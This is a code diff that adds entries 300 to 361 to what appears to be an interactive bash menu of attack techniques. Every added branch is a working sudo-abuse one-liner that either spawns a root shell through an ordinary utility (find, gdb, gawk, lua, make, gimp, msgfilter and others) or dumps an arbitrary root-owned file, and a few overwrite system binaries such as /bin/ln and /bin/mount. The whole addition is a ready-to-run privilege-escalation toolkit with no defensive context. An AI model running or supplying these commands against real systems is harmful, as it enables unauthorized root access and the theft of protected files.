@@ -196,7 +196,28 @@ while true; do
 	echo -ne " 290. PrivEsc with dmsetup\t\t\t\t291. PrivEsc with docker\t\t\t292. PrivEsc with easy_install\n"
 	echo -ne " 293. PrivEsc with eb\t\t\t\t\t294. PrivEsc with ed\t\t\t\t295. PrivEsc with emacs\n"
 	echo -ne " 296. PrivEsc with env\t\t\t\t\t297. Read a root's file with eqn\t\t298. PrivEsc with ex\n"
-	echo -ne " 299. Read a root's file with expand\n"
+	echo -ne " 299. Read a root's file with expand\t\t\t300. PrivEsc with expect\t\t\t301. PrivEsc with facter\n"
+	echo -ne " 302. Read a root's file with file\t\t\t303. PrivEsc with find\t\t\t\t304. PrivEsc with flock\n"
+	echo -ne " 305. Read a root's file with fmt\t\t\t306. Read a root's file with fold\t\t307. PrivEsc with ftp\n"
+	echo -ne " 308. PrivEsc with gawk\t\t\t\t\t309. PrivEsc woth gcc\t\t\t\t310. PrivEsc with gdb\n"
+	echo -ne " 311. PrivEsc with gem\t\t\t\t\t312. Read a root's file with genisoimage\n"
+	echo -ne " 313. PrivEsc with ghc\t\t\t\t\t314. PrivEsc with ghci\t\t\t\t315. PrivEsc with gimp\n"
+	echo -ne " 316. PrivEsc with git\t\t\t\t\t317. Read a root's file with grep\t\t318. PrivEsc with gtester\n"
+	echo -ne " 319. Read a root's file with gzip\t\t\t320. Read a root's file with hd\t\t\t321. Read a root's file with head\n"
+	echo -ne " 322. Read a root's file with hexdump\t\t\t323. Read a root's file with highlight\t\t324. PrivEsc with hping3\n"
+	echo -ne " 325. Read a root's file with iconv\t\t\t326. PrivEsc with iftop\t\t\t\t327. Read a root's file with install\n"
+	echo -ne " 328. PrivEsc with ionice\t\t\t\t329. Read a root's file with ip\t\t\t330. PrivEsc with irb\n"
+	echo -ne " 331. PrivEsc with jjs\t\t\t\t\t332. Read a root's file with join\t\t333. PrivEsc with journalctl\n"
+	echo -ne " 334. Read a root's file with jq\t\t\t335. PrivEsc with jrunscript\t\t\t336. PrivEsc with knife\n"
+	echo -ne " 337. PrivEsc with ksh\t\t\t\t\t338. Read a root's file with ksshell\t\t339. PrivEsc with ld.so\n"
+	echo -ne " 340. PrivEsc with ldconfig\t\t\t\t341. PrivEsc with less\t\t\t\t342. PrivEsc with ln\n"
+	echo -ne " 343. PrivEsc with loginctl\t\t\t\t344. PrivEsc with logsave\t\t\t345. Read a root's file with look\n"
+	echo -ne " 346. PrivEsc with ltrace\t\t\t\t347. PrivEsc with lua\t\t\t\t348. PrivEsc with lualatex\n"
+	echo -ne " 349. PrivEsc with luatex\t\t\t\t350. Read a root's file with lwp-request\t351. PrivEsc with mail\n"
+	echo -ne " 352. PrivEsc with make\t\t\t\t\t353. PrivEsc with man\t\t\t\t354. PrivEsc with mawk\n"
+	echo -ne " 355. PrivEsc with more\t\t\t\t\t356. PrivEsc with mount\t\t\t\t357. Read a root's file with msgattrib\n"
+	echo -ne " 358. Read a root's file with msgcat\t\t\t359. Read a root's file with msgconv\t\t360. PrivEsc with msgfilter\n"
+	echo -ne " 361. Read a root's file with msgmerge\n"
 	echo "WINRM"
 	echo -ne " 132. Alamot/code-snippets/winrm/\n"
 	echo "OTHERS"
@@ -1761,6 +1782,336 @@ while true; do
 		if [[ -f "$LFILE" ]];
 		then
 			sudo expand "$LFILE"
+		fi
+	;;
+	"300")
+		sudo expect -c 'spawn /bin/sh;interact'
+	;;
+	"301")
+		TF=$(mktemp -d)
+		echo 'exec("/bin/sh")' > $TF/x.rb
+		sudo FACTERLIB=$TF facter
+	;;
+	"302")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo file -f $LFILE
+		fi
+	;;
+	"303")
+		sudo find . -exec /bin/sh \; -quit
+	;;
+	"304")
+		sudo flock -u / /bin/sh
+	;;
+	"305")
+		echo "Digit a root's file to make readable"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo fmt -999 "$LFILE"
+		fi
+	;;
+	"306")
+		echo "Digit a root's file to make readable"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo fold -w99999999 "$LFILE"
+		fi
+	;;
+	"307")
+		echo "!/bin/sh"
+		sudo ftp
+		!/bin/sh
+	;;
+	"308")
+		sudo gawk 'BEGIN {system("/bin/sh")}'
+	;;
+	"309")
+		sudo gcc -wrapper /bin/sh,-s .
+	;;
+	"310")
+		sudo gdb -nx -ex '!sh' -ex quit
+	;;
+	"311")
+		sudo gem open -e "/bin/sh -c /bin/sh" rdoc
+	;;
+	"312")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo genisoimage -q -o - "$LFILE"
+		fi
+	;;
+	"313")
+		sudo ghc -e 'System.Process.callCommand "/bin/sh"'
+	;;
+	"314")
+		echo "System.Process.callCommand \"/bin/sh\""
+		sudo ghci
+		System.Process.callCommand "/bin/sh"
+	;;
+	"315")
+		sudo gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system("sh")'
+	;;
+	"316")
+		echo "!/bin/sh"
+		sudo git -p help config
+		!/bin/sh
+	;;
+	"317")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo grep '' $LFILE
+		fi
+	;;
+	"318")
+		TF=$(mktemp)
+		echo '#!/bin/sh' > $TF
+		echo 'exec /bin/sh 0<&1' >> $TF
+		chmod +x $TF
+		sudo gtester -q $TF
+	;;
+	"319")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo gzip -f $LFILE -t
+		fi
+	;;
+	"320")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo hd "$LFILE"
+		fi
+	;;
+	"321")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo head -c1G "$LFILE"
+		fi
+	;;
+	"322")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo hexdump -C "$LFILE"
+		fi
+	;;
+	"323")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo highlight --no-doc --failsafe "$LFILE"
+		fi
+	;;
+	"324")
+		echo "/bin/sh"
+		sudo hping3
+		/bin/sh
+	;;
+	"325")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo iconv -f 8859_1 -t 8859_1 "$LFILE"
+		fi
+	;;
+	"326")
+		echo "!/bin/sh"
+		sudo iftop
+		!/bin/sh
+	;;
+	"327")
+		echo "Digit a root's file to make readable"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			TF=$(mktemp)
+			sudo install -m 6777 $LFILE $TF
+		fi
+	;;
+	"328")
+		sudo ionice /bin/sh
+	;;
+	"329")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo ip -force -batch "$LFILE"
+		fi
+	;;
+	"330")
+		echo "exec '/bin/bash'"
+		sudo irb
+		exec '/bin/bash'
+	;;
+	"331")
+		echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()" | sudo jjs
+	;;
+	"332")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo join -a 2 /dev/null $LFILE
+		fi
+	;;
+	"333")
+		echo "!/bin/sh"
+		sudo journalctl
+		!/bin/sh
+	;;
+	"334")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo jq -Rr . "$LFILE"
+		fi
+	;;
+	"335")
+		sudo jrunscript -e "exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')"
+	;;
+	"336")
+		sudo knife exec -E 'exec "/bin/sh"'
+	;;
+	"337")
+		sudo ksh
+	;;
+	"338")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo ksshell -i $LFILE
+		fi
+	;;
+	"339")
+		sudo /lib/ld.so /bin/sh
+	;;
+	"340")
+		TF=$(mktemp -d)
+		echo "$TF" > "$TF/conf"
+		sudo ldconfig -f "$TF/conf"
+	;;
+	"341")
+		echo "!/bin/sh"
+		sudo less /etc/profile
+		!/bin/sh
+	;;
+	"342")
+		sudo ln -fs /bin/sh /bin/ln
+		sudo ln
+	;;
+	"343")
+		echo "!/bin/sh"
+		sudo loginctl user-status
+		!/bin/sh
+	;;
+	"344")
+		sudo logsave /dev/null /bin/sh -i
+	;;
+	"345")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo look '' "$LFILE"
+		fi
+	;;
+	"346")
+		sudo ltrace -b -L /bin/sh
+	;;
+	"347")
+		sudo lua -e 'os.execute("/bin/sh")'
+	;;
+	"348")
+		sudo lualatex -shell-escape '\documentclass{article}\begin{document}\directlua{os.execute("/bin/sh")}\end{document}'
+	;;
+	"349")
+		sudo luatex -shell-escape '\directlua{os.execute("/bin/sh")}\end'
+	;;
+	"350")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo lwp-request "file://$LFILE"
+		fi
+	;;
+	"351")
+		sudo mail --exec='!/bin/sh'
+	;;
+	"352")
+		COMMAND='/bin/sh'
+		sudo make -s --eval=$'x:\n\t-'"$COMMAND"
+	;;
+	"353")
+		echo "!/bin/sh"
+		sudo man man
+		!/bin/sh
+	;;
+	"354")
+		sudo mawk 'BEGIN {system("/bin/sh")}'
+	;;
+	"355")
+		echo "!/bin/sh"
+		TERM= sudo more /etc/profile
+		!/bin/sh
+	;;
+	"356")
+		sudo mount -o bind /bin/sh /bin/mount
+		sudo mount
+	;;
+	"357")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo msgattrib -P $LFILE
+		fi
+	;;
+	"358")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo msgcat -P $LFILE
+		fi
+	;;
+	"359")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo msgconv -P $LFILE
+		fi
+	;;
+	"360")
+		echo x | sudo msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'
+	;;
+	"361")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo msgmerge -P $LFILE /dev/null
 		fi
 	;;
 	*)
